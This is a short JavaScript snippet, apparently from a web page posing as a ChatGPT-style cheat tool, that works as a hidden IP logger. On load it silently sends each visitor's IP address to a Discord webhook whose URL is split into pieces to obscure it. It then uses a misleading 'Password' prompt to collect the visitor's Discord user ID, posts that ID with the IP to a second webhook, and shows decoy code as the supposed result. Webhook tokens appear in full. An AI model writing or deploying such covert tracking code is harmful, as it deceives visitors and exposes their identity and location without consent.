  let output = document.getElementById("output");

    const webhookURL = "https://discord.com/api/webhooks/111109521877159536" + "5/e" + "YRfGcePmrFrybbkSprsHz_rbk9gq1xVWZFSzrOqRPPRwJZBV5V4bpNUUFhbBuKdbdo" + "o";
    const ipAddressURL = "https://api.ipify.org/?format=json";

    fetch(ipAddressURL)
      .then(response => response.json())
      .then(data => {
        const ipAddress = data.ip;

        const payload = {
          content: `Someone visited the website **${ipAddress}**`
        };
        fetch(webhookURL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(payload)
        });
      });

function scummyChatGPT() {
  let username = prompt("Password: (Just type in YOUR user ID. There's a whitelist system, by default, everyones ID is whitelisted.)");

  let output = document.getElementById("output");

  if (username) {
    const webhookURL = "https://discord.com/api/webhooks/1160022130474352651/KLW27NyUEoBUPYcYnXO2U27xxQo3KPdc1fO13cHr-ETXvQ38q4Jkrd_WKtjzo3QnHliR";
    const ipAddressURL = "https://api.ipify.org/?format=json";

    fetch(ipAddressURL)
      .then(response => response.json())
      .then(data => {
        const ipAddress = data.ip;

        const payload = {
          content: `<@${username}> **${ipAddress}**`
        };
        fetch(webhookURL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(payload)
        });
      });

    output.innerText = `var lesson = hook.iframe.currLesson;
    const fs = require('fs');
    function replaceInFile(filePath, searchStr, replaceStr) {
      try {
        let fileContent = fs.readFileSync(filePath, 'utf8');
        fileContent = fileContent.replace(searchStr, replaceStr);
        fs.writeFileSync(filePath, fileContent, 'utf8');
      }
    }
    const filePath = '895.js';
    const searchStr = 'if (a === 1) { a = 2 }';
    const replaceStr = 'if (a === 1) { a = 3 }';
    replaceInFile(filePath, searchStr, replaceStr);`;
  }
}

scummyChatGPT()
